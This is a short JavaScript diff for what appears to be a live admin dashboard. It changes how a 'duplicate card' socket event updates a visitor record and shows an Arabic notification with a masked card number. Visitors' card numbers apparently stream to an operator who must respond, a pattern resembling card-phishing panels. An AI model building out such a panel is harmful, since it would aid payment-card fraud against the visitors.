@@ -1147,12 +1147,21 @@
         }
       });
 
-      socket.on('visitor:duplicateCard', ({ visitorId, cardNumber }) => {
-        const visitor = visitors.get(visitorId);
-        if (visitor) {
+      socket.on('visitor:duplicateCard', ({ visitorId, cardNumber, visitor: updatedVisitor }) => {
+        const existing = visitors.get(visitorId);
+        if (existing) {
+          // Update visitor - remove waiting status
+          existing.waitingForAdminResponse = false;
+          if (updatedVisitor) Object.assign(existing, updatedVisitor);
+          existing.waitingForAdminResponse = false;
+          visitors.set(visitorId, existing);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(existing);
+          }
           // Show notification
           const maskedCard = cardNumber ? cardNumber.slice(0, 4) + ' **** **** ' + cardNumber.slice(-4) : '';
-          showNotification('⚠️ تم رفض بطاقة مكررة من الزائر #' + visitor.visitorNumber + ' - ' + maskedCard);
+          showNotification('⚠️ تم رفض بطاقة مكررة من الزائر #' + existing.visitorNumber + ' - ' + maskedCard);
           try {
             frogAudio.currentTime = 0;
             frogAudio.play().catch(() => {});
